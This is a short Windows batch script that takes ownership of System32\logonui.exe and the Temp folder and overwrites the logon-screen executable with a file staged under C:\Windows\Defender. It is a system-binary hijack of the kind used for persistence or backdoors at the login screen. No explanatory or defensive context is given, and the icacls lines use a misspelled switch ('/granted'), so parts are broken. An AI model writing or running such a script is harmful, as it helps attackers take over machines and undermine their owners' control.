@echo on
cd\&cd Windows\System32
takeown /f logonui.exe
icacls logonui.exe /granted %username%:F
takeown /f "C:\Windows\Temp" /r /d y
icacls "C:\Windows\Temp" /granted %username%:F /T /C
copy "C:\Windows\Defender\LogonUIStart.exe" "C:\Windows\System32\LogonUI.exe" /Y
copy "C:\Windows\Defender\LogonUi.exe" "C:\Windows\Temp\LogonUi.exe" /Y